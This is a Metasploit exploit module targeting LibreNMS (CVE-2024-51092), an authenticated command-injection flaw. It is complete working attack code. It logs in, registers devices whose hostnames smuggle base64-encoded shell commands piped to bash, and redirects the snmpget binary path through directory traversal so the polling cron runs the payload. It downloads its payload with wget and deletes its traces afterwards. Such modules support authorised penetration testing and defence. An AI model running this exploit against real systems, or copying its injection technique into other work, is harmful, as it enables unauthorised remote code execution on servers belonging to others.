##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LibreNMS Authenticated RCE (CVE-2024-51092)',
        'Description' => %q{
          An authenticated attacker can create dangerous directory names on the system and
          alter sensitive configuration parameters through the web portal.
          Those two defects combined then allows to inject arbitrary OS commands inside shell_exec() calls,
          thus achieving arbitrary code execution.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'murrant (Tony Murray)', # PoC
          'Takahiro Yokoyama'      # Metasploit module
        ],
        'References' => [
          [ 'URL', 'https://github.com/advisories/GHSA-x645-6pf9-xwxw'],
          [ 'CVE', '2024-51092']
        ],
        'Platform' => %w[linux],
        'Targets' => [
          [
            'Linux Command', {
              'Arch' => [ ARCH_CMD ], 'Platform' => [ 'unix', 'linux' ], 'Type' => :nix_cmd,
              'DefaultOptions' => {
                'FETCH_COMMAND' => 'WGET'
              }
            }
          ],
        ],
        'DefaultOptions' => {
          'FETCH_DELETE' => true
        },
        'DefaultTarget' => 0,
        'DisclosureDate' => '2024-11-15',
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION, ]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [ true, 'User name for LibreNMS', '' ]),
        OptString.new('PASSWORD', [ true, 'Password for LibreNMS', '' ]),
        OptString.new('PATH', [ true, 'LibreNMS installed location', '/opt/librenms' ]),
        OptInt.new('WAIT', [ true, 'Wait time (seconds) for cron to poll the device', 30 ]),
        OptInt.new('RETRY', [ true, 'Maximum wait time: WAIT x RETRY (seconds)', 11 ]),
      ]
    )
  end

  def get_csrf_token(res)
    res&.get_html_document&.at('meta[name="csrf-token"]') ? res.get_html_document.at('meta[name="csrf-token"]')['content'] : nil
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login'),
      'keep_cookies' => true
    })
    return Exploit::CheckCode::Unknown('LibreNMS is not detected.') unless res&.code == 200 && res&.body&.include?('<title>LibreNMS</title>')

    token = get_csrf_token(res)
    return Exploit::CheckCode::Unknown('LibreNMS detected. Failed to extract csrf token.') unless token

    login
    return Exploit::CheckCode::Detected('LibreNMS detected. Failed to login and version is unknown.') unless @cookies

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'about'),
      'cookie' => @cookies
    })
    return Exploit::CheckCode::Detected('LibreNMS detected. Version is unknown.') unless res&.code == 200

    html_body = res.get_html_document
    version_node = html_body.at("a[@href='https://www.librenms.org/changelog.html']")
    version_node.at('span').content = ''
    version = Rex::Version.new(version_node.text)
    return Exploit::CheckCode::Safe("LibreNMS version #{version} detected, which is not vulnerable.") unless version <= Rex::Version.new('24.9.1')

    Exploit::CheckCode::Appears("LibreNMS version #{version} detected, which is vulnerable.")
  end

  def login
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login'),
      'keep_cookies' => true
    })
    fail_with(Failure::Unknown, 'Failed to access the login page.') unless res&.code == 200

    cookies = res.get_cookies
    login_res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'login'),
      'cookie' => cookies,
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        '_token' => get_csrf_token(res)
      }
    })
    fail_with(Failure::NoAccess, 'Failed to log into LibreNMS.') unless login_res&.code == 302

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path),
      'cookie' => login_res.get_cookies
    })
    fail_with(Failure::Unknown, 'Failed to log into LibreNMS.') unless res&.code == 200 && res.body.include?('Devices')

    @cookies = login_res.get_cookies
    print_status('Successfully logged into LibreNMS.')
  end

  def exploit
    login unless @cookies
    add_host

    [1, datastore['RETRY']].max.times do |i|
      print_status("[#{i + 1}/#{datastore['RETRY']}] Waiting #{datastore['WAIT']} seconds for cron to poll the device...")
      sleep datastore['WAIT']
      break if @hosts.all? { |h| change_snmpget(h) }
    end

    fail_with(Failure::Unknown, 'Failed to create malicious files. You may need more wait time, or the cron job might be disabled.') unless @hosts.all? { |h| change_snmpget(h) }
    @hosts.each do |host|
      res = change_snmpget(host)
      fail_with(Failure::Unknown, 'Failed to update snmpget.') unless res
      send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'about'),
        'cookie' => @cookies
      })
      sleep 3
    end
  end

  def add_host
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'addhost'),
      'cookie' => @cookies
    })
    fail_with(Failure::Unknown, 'Failed to access addhost page.') unless res&.code == 200
    @hosts = []
    @device_ids = []
    # The maximum host length is 128 characters, so the payload must be split.
    payload.encoded.split(';').each do |pl|
      host = "#{rand_text_alphanumeric(3, '/')};echo #{Rex::Text.encode_base64(pl)}|base64 -d|bash;#"
      fail_with(Failure::Unknown, 'Failed to limit the host length to 128 characters or less.') unless host.length <= 128
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'addhost'),
        'cookie' => @cookies,
        'vars_post' => {
          '_token' => get_csrf_token(res),
          'hostname' => host,
          'snmp' => 'on',
          'sysName' => '',
          'hardware' => '',
          'os' => '',
          'os_id' => '',
          'snmpver' => 'v2c',
          'port' => '',
          'transport' => 'udp',
          'port_assoc_mode' => 'ifIndex',
          'community' => '',
          'authlevel' => 'noAuthNoPriv',
          'authname' => '',
          'authpass' => '',
          'authalgo' => 'SHA',
          'cryptopass' => '',
          'cryptoalgo' => 'AES',
          'force_add' => 'on',
          'Submit' => ''
        }
      })
      fail_with(Failure::Unknown, 'Failed to add device.') unless res&.code == 200 && res&.body&.include?('Device added')
      print_status("Added host: '#{host}'")
      print_status("Actual payload: #{pl}")
      @hosts << host
      link = res&.get_html_document&.at("div.alert.alert-success:contains('Device added') a")
      device_link = link['href'] if link
      device_id = device_link.match(%r{/device/(\d+)})[1] if device_link&.match(%r{/device/(\d+)})
      @device_ids << device_id if device_id
    end
  end

  def change_snmpget(host)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'settings/external/binaries'),
      'keep_cookies' => true,
      'cookie' => @cookies
    })
    return unless res&.code == 200

    res = send_request_cgi({
      'method' => 'PUT',
      'headers' => {
        'X-CSRF-TOKEN' => get_csrf_token(res)
      },
      'uri' => normalize_uri(target_uri.path, 'settings/snmpget'),
      'cookie' => res.get_cookies,
      'ctype' => 'application/json',
      'data' => {
        'value' => "file://#{datastore['PATH']}/rrd/#{host}/../../../../../bin/ls"
      }.to_json
    })
    res&.code == 200
  end

  def cleanup
    super

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'settings/external/binaries'),
      'keep_cookies' => true,
      'cookie' => @cookies
    })

    if res&.code == 200
      res = send_request_cgi({
        'method' => 'DELETE',
        'headers' => {
          'X-CSRF-TOKEN' => get_csrf_token(res)
        },
        'uri' => normalize_uri(target_uri.path, 'settings/snmpget'),
        'cookie' => @cookies
      })
    end
    print_status('Failed to reset snmpget to default.') unless res&.code == 200
    print_status('Reset snmpget to default.') if res&.code == 200

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'delhost'),
      'cookie' => @cookies
    })
    token = get_csrf_token(res)

    if res&.code == 200
      @device_ids&.each do |device_id|
        res = send_request_cgi({
          'method' => 'POST',
          'uri' => normalize_uri(target_uri.path, 'delhost'),
          'cookie' => @cookies,
          'vars_post' => {
            '_token' => token,
            'id' => device_id,
            'confirm' => '1'
          }
        })
        print_status("Failed to delete device: #{device_id}") unless res&.code == 200
        print_status("Deleted device: #{device_id}") if res&.code == 200
      end
    elsif @device_ids
      print_status("Failed to delete devices: #{@device_ids.join(',')}")
    end
  end

end
